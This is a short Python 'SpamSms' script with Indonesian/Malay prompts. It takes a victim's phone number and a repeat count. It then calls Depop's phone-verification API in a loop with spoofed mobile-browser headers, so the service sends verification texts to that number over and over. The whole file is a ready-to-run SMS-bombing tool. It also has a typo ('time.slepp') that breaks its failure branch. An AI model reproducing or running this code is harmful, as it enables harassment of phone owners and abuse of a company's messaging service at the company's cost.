import requests,json,os,time
from requests import put

banner="""
\t----------
\t SpamSms
\t----------

-------------------
[+] Creator : NIK
-------------------
"""

os.system("clear")
print(banner)
nomor=input("[+] Nomor: ")
jumlah=int(input("[+] Jumlah: "))
print()
headers={
"Host":"webapi.depop.com",
"content-length":"49",
"accept":"application/json, text/plain, */*",
"sec-ch-ua-mobile":"?1",
"user-agent":"Mozilla/5.0 (Linux; Android 10; V2027) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36",
"content-type":"application/json",
"origin":"https://signup.depop.com",
"sec-fetch-site":"same-site",
"sec-fetch-mode":"cors",
"sec-fetch-dest":"empty",
"referer":"https://signup.depop.com/",
"accept-encoding":"gzip, deflate, br",
"accept-language":"ms-MY,ms;q=0.9,id;q=0.8,en;q=0.7",
}
data={
"phone_number":nomor,
"country_code":"MY"
}
for i in range(int(jumlah)):
    respon=requests.put("https://webapi.depop.com/api/v1/auth/verify/phone",headers=headers,json=data)
    nik=json.loads(respon.text)
    if nik['is_verified']==False:
        print("[-] Spam Sms Berhasil")
        time.sleep(2)
    else:
        print("[-] Spam Sms Gagal")
        time.slepp(2)

